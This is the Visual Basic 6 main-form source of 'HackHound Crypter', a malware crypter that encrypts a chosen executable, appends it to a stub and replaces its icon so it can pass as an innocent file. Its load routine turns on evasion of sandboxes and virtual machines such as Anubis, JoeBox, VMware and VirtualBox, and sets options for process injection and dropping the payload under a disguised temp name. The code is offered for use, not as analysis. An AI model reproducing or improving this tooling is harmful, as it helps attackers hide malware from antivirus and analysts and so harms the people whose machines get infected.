VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "HackHound Crypter"
   ClientHeight    =   5475
   ClientLeft      =   0
   ClientTop       =   60
   ClientWidth     =   7560
   LinkTopic       =   "Form1"
   Picture         =   "frmMain.frx":0000
   ScaleHeight     =   5475
   ScaleWidth      =   7560
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   2400
      TabIndex        =   17
      Top             =   2400
      Width           =   4695
   End
   Begin VB.TextBox Text3 
      Height          =   285
      Left            =   3480
      TabIndex        =   10
      Top             =   3720
      Width           =   1335
   End
   Begin MSComDlg.CommonDialog DLGSave 
      Left            =   120
      Top             =   720
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   285
      Left            =   2400
      TabIndex        =   3
      Top             =   2880
      Width           =   4695
   End
   Begin VB.PictureBox Picture1 
      BorderStyle     =   0  'None
      Height          =   1815
      Left            =   60
      Picture         =   "frmMain.frx":E731
      ScaleHeight     =   1815
      ScaleWidth      =   7455
      TabIndex        =   16
      Top             =   360
      Width           =   7460
   End
   Begin VB.Image Image4 
      Height          =   8610
      Left            =   7500
      Picture         =   "frmMain.frx":1D040
      Top             =   360
      Width           =   60
   End
   Begin VB.Label Label14 
      BackStyle       =   0  'Transparent
      Caption         =   "About"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   840
      TabIndex        =   15
      Top             =   4800
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Label Label13 
      BackStyle       =   0  'Transparent
      Caption         =   "About"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   840
      TabIndex        =   14
      Top             =   4800
      Width           =   1215
   End
   Begin VB.Image Image18 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":2014D
      Top             =   4680
      Width           =   1965
   End
   Begin VB.Label Label10 
      BackStyle       =   0  'Transparent
      Caption         =   "Random Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   3480
      TabIndex        =   13
      Top             =   4200
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "Random Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   3480
      TabIndex        =   12
      Top             =   4200
      Width           =   1335
   End
   Begin VB.Image Image14 
      Height          =   435
      Left            =   3120
      Picture         =   "frmMain.frx":23DE6
      Top             =   4080
      Width           =   1965
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Encryption Key"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   3480
      TabIndex        =   11
      Top             =   3360
      Width           =   1575
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Crypt"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   840
      TabIndex        =   9
      Top             =   4200
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Crypt"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   840
      TabIndex        =   8
      Top             =   4200
      Width           =   855
   End
   Begin VB.Image Image1 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":27A7F
      Top             =   4080
      Width           =   1965
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "                                               HackHound Crypter"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   0
      TabIndex        =   7
      Top             =   0
      Width           =   7095
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   840
      TabIndex        =   6
      Top             =   3600
      Visible         =   0   'False
      Width           =   1215
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Load Icon"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   195
      Left            =   840
      TabIndex        =   5
      Top             =   3000
      Visible         =   0   'False
      Width           =   975
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Add File"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000018&
      Height          =   255
      Left            =   840
      TabIndex        =   4
      Top             =   2400
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.Image Image3 
      Height          =   255
      Left            =   6960
      Picture         =   "frmMain.frx":2B718
      Top             =   60
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Image Image17 
      Height          =   390
      Left            =   7470
      Picture         =   "frmMain.frx":2E93D
      Top             =   -15
      Width           =   105
   End
   Begin VB.Image Image16 
      Height          =   390
      Left            =   0
      Picture         =   "frmMain.frx":31548
      Top             =   -10
      Width           =   90
   End
   Begin VB.Label Label12 
      BackStyle       =   0  'Transparent
      Caption         =   "Settings"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   840
      TabIndex        =   2
      Top             =   3600
      Width           =   1215
   End
   Begin VB.Image Image13 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":3413A
      Top             =   3480
      Width           =   1965
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Add File"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   255
      Left            =   840
      TabIndex        =   1
      Top             =   2400
      Width           =   855
   End
   Begin VB.Label Label11 
      BackStyle       =   0  'Transparent
      Caption         =   "Load Icon"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000016&
      Height          =   195
      Left            =   840
      TabIndex        =   0
      Top             =   3000
      Width           =   975
   End
   Begin VB.Image Image11 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":37DD3
      Top             =   2880
      Width           =   1965
   End
   Begin VB.Image Image2 
      Height          =   255
      Left            =   6960
      Picture         =   "frmMain.frx":3BA47
      Top             =   60
      Width           =   495
   End
   Begin VB.Image Image8 
      Height          =   435
      Left            =   240
      Picture         =   "frmMain.frx":3EC60
      Top             =   2280
      Width           =   1965
   End
   Begin VB.Image Image6 
      Height          =   60
      Left            =   0
      Picture         =   "frmMain.frx":428D4
      Top             =   5400
      Width           =   11985
   End
   Begin VB.Image Image5 
      Height          =   8610
      Left            =   0
      Picture         =   "frmMain.frx":45AEB
      Top             =   360
      Width           =   60
   End
   Begin VB.Image Image9 
      Height          =   375
      Left            =   0
      Picture         =   "frmMain.frx":48C41
      Top             =   0
      Width           =   12000
   End
   Begin VB.Image Image15 
      DragMode        =   1  'Automatic
      Height          =   12000
      Left            =   -4440
      Picture         =   "frmMain.frx":4D48C
      Top             =   -5280
      Width           =   12000
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Crypter based off Cobeins Cryptosy
'Edited by legssmit
' Use  : At your own risk
' ' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission FROM COBEIN AND ME (Legssmit).


Option Explicit

Public IconPath As String

Private Declare Function GetFileNameFromBrowseW Lib "shell32" Alias "#63" (ByVal hwndOwner As Long, ByVal lpstrFile As Long, ByVal nMaxFile As Long, ByVal lpstrInitialDir As Long, ByVal lpstrDefExt As Long, ByVal lpstrFilter As Long, ByVal lpstrTitle As Long) As Long
Private Declare Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As String) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dst As Any, Src As Any, ByVal cLen As Long)

Private Dragging As Boolean
Private SettedX As Integer, SettedY As Integer
Dim var1 As String
Dim Keyset As String
Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim FF As Integer
    
    FF = FreeFile
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #FF
    lFileSize = LOF(FF)
    sData = Input$(lFileSize, FF)
    Close #FF
    LoadFile = sData
End Function
Private Sub Form_Load()
    AntiAnubis = 1
    AntiJoeBox = 1
    AntiSandBoxie = 1
    AntiCWSandBox = 1
    AntiThreatExpert = 1
    AntiVMware = 1
    AntiVirtualPC = 1
    AntiVirtualBox = 1
    LengteOrig = 1
    LengteVanBestand = 1
    DelayInSecs = 0
    PreserveEOF = 1
    ValidatePE = 1
    MsgOptions = 0
    InjectionPath = 0
    MeltStub = 0
    DropAs = "673353.tmp"
    ProcToKill = ""
Call GetRandomKey
End Sub

Private Sub Image1_Click()
Call WriteCryptedFile
End Sub

Private Sub Image11_Click()
AddIcon
End Sub

Private Sub Image13_Click()
Form2.Show
End Sub

Private Sub Image14_Click()
Call GetRandomKey
End Sub

Private Sub Image15_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = False
Label4.Visible = False
Label5.Visible = False
Label6.Visible = False
Label10.Visible = False
Label14.Visible = False
End Sub

Private Sub Image18_Click()
Form3.Show
End Sub

Private Sub Image3_Click()
End
End Sub

Private Sub Image8_Click()
Call AddFile
End Sub

Private Sub Image9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = False
End Sub

Private Sub Label1_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
    SettedX = x
    SettedY = y
    Dragging = True
End Sub

Private Sub Label1_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
    If Dragging Then
        Me.Left = Me.Left + (x - SettedX)
        Me.Top = Me.Top + (y - SettedY)
    End If
Image3.Visible = False
End Sub

Private Sub Label1_MouseUp(Button As Integer, Shift As Integer, x As Single, y As Single)
    Dragging = False
End Sub

Private Sub Label14_Click()
Form3.Show
End Sub

Private Sub Label4_Click()
Call AddIcon
End Sub



Private Sub Label3_Click()
Call AddFile
End Sub

Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Image3.Visible = True
End Sub

Private Sub Label2_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = True
End Sub

Private Sub Label11_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = True
End Sub

Private Sub Image8_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label3.Visible = True
End Sub

Private Sub Image11_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label4.Visible = True
End Sub



Private Sub Label12_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label5.Visible = True
End Sub

Private Sub Label5_Click()
Form2.Show
End Sub

Private Function WriteCryptedFile()
If Text1 = vbNullString Then GoTo ErrorHandler


Dim sSave As String
       Dim CryptedPath As String
       Dim FF As Integer
       Dim EOFData() As Byte
       
       
        With DLGSave
        .CancelError = True
        .DefaultExt = ".exe"
        .Filter = "Exe Files (*.exe)|*.exe|Scr Files (*.scr)|*.scr|Com Files (*.com)|*.com|Bat Files (*.bat)|*.bat|Pif Files (*.pif)|*.pif|"
        .FileName = "Crypted.exe"
        .ShowSave
        End With
        CryptedPath = DLGSave.FileName
                       
                       
            Dim sBuff As String
            Dim c As New clsCryptAPI
            Dim sSize As String * 8
            Dim Parameters As String
            Dim IconPath As String
            Dim Err As String
            

            If Not Text1 = vbNullString Then
            
            
            
                If PathFileExists(CryptedPath) Then
                    Kill CryptedPath
                End If
                
                FF = FreeFile

                Open Text1 For Binary Access Read As #FF
                EOFData = GetEOFData(FF)
                LengteVanBestand = LOF(FF) - GetEOF(Text1)
                LengteOrig = LOF(FF)
                Close #FF
                
                Call Form2.WriteSettings
                
                FF = FreeFile
                
                Open CryptedPath For Binary Access Write As #FF
                sBuff = LoadFile(App.Path & "\Stub.exe")
                Put #FF, , sBuff
                sBuff = LoadFile(Text1)
                sBuff = c.EncryptString(sBuff, Text3)
                Put #FF, , sBuff
                sSize = Len(sBuff)
                Put #FF, , sSize
                Put #FF, , 27
                
                If PreserveEOF = 1 And Not Not EOFData Then
                Put #FF, LOF(FF) + 1, CStr(StrConv(EOFData, vbUnicode))
                End If
                Close #FF
                If ValidatePE = 1 Then Call RealignPEFromFile(DLGSave.FileName)
                If Text2 <> "" Then Call ReplaceIcons(Text2, DLGSave.FileName, Err)
                MsgBox "Done"
            End If

Exit Function
ErrorHandler:
MsgBox "Please Select a File First", vbCritical
End Function

Private Sub Label7_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label6.Visible = True
End Sub

Private Sub Label6_Click()
Call WriteCryptedFile
End Sub

Private Sub Label9_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label10.Visible = True
End Sub

Private Sub Label10_Click()
Call GetRandomKey
End Sub

Private Function RandomNumber() As Integer
    Randomize
    var1 = Int(9 * Rnd)
    RandomNumber = var1
End Function

Private Function RandomLetter() As String
Anfang:
    Keyset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    Randomize
    var1 = Int(26 * Rnd)
    If var1 = 0 Then GoTo Anfang
    RandomLetter = Mid(Keyset, var1, 1)
End Function

Private Function GetRandomKey()
Dim i As Long
    Text3.Text = ""
    For i = 1 To 10
        If i = 2 Or i = 4 Or i = 6 Then
            Text3.Text = Text3.Text & RandomNumber
        Else
            Text3.Text = Text3.Text & RandomLetter
        End If
    Next i
EncryptionKey = Text3.Text
End Function

Private Sub Label13_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
Label14.Visible = True
End Sub
Function GetEOF(Path As String) As Long

    Dim ByteArray() As Byte
    Dim PE As Long, NumberOfSections As Integer
    Dim BeginLastSection As Long
    Dim RawSize As Long, RawOffset As Long
       
    Open Path For Binary As #2
        ReDim ByteArray(LOF(2) - 1)
        Get #2, , ByteArray
    Close #2
   
    Call CopyMemory(PE, ByteArray(&H3C), 4)
    Call CopyMemory(NumberOfSections, ByteArray(PE + &H6), 2)
    BeginLastSection = PE + &HF8 + ((NumberOfSections - 1) * &H28)
    Call CopyMemory(RawSize, ByteArray(BeginLastSection + 16), 4)
    Call CopyMemory(RawOffset, ByteArray(BeginLastSection + 20), 4)
    GetEOF = RawSize + RawOffset
   
End Function

Private Function AddFile()
            Dim sSave As String
            sSave = Space(255)
            GetFileNameFromBrowseW Me.hWnd, StrPtr(sSave), 255, StrPtr("c:\"), StrPtr("txt"), StrPtr("Apps (*.EXE)" + Chr$(0) + "*.EXE" + Chr$(0) + "All files (*.*)" + Chr$(0) + "*.*" + Chr$(0)), StrPtr("Select File")
            Text1 = (Left$(sSave, lstrlen(sSave)))
End Function

Private Function AddIcon()
Dim sIcon As String
            sIcon = Space(255)
            GetFileNameFromBrowseW Me.hWnd, StrPtr(sIcon), 255, StrPtr("c:\"), StrPtr("txt"), StrPtr("Icons (*.ICO)" + Chr$(0) + "*.ICO" + Chr$(0)), StrPtr("Select File")
            Text2 = Left$(sIcon, lstrlen(sIcon))

End Function

